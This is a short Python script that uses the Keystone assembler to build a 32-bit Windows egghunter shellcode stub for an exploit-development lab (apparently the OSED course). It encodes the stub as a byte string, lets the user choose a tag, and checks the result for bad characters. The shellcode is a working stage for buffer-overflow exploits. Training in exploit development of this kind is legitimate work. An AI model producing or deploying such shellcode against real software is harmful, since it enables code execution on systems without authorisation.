#!/usr/bin/python3
import sys
import argparse
import keystone as ks

def tag_to_hex(s):
    retval = list()
    for char in s:
        retval.append(hex(ord(char)).replace('0x', ''))
    return '0x' + ''.join(retval[::-1])

def main(args):

    egghunter = f"""
    loop_inc_page:
        or dx, 0x0fff
    loop_inc_one:
        inc edx
    loop_check:
        push edx
        xor eax, eax
        add ax, 0x01c6
        int 0x2e
        cmp al, 05
        pop edx
    loop_check_valid:
        je loop_inc_page
    is_egg:
        mov eax, {tag_to_hex(args.tag)}
        mov edi, edx
        scasd
        jnz loop_inc_one
    first_half_found:
        scasd
        jnz loop_inc_one
    matched_both_halves:
        jmp edi
    """

    eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
    encoding, count = eng.asm(egghunter)

    final = ""

    final += 'egghunter = b"'

    for enc in encoding:
        final += "\\x{0:02x}".format(enc)

    final += '"'

    sentry = False

    for bad in args.bad_chars:
        if bad in final:
            print(f"[!] Found 0x{bad}")
            sentry = True
    
    if sentry:
        print(f'[=] {final[14:-1]}', file=sys.stderr)
        raise SystemExit("[!] Remove bad characters and try again")
    
    print(final)
    print(f"egghunter created:\n  len: {len(encoding)} bytes\n  tag: {args.tag * 2}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Creates an egghunter compatible with the OSED lab VM')
    parser.add_argument('-t', '--tag', help='tag for which the egghunter will search (default: c0d3)', default='c0d3')
    parser.add_argument('-b', '--bad-chars', help='space separated list of bad chars to check for in final egghunter (default: 00)', default=['00'], nargs='+')
    
    args = parser.parse_args()

    main(args)
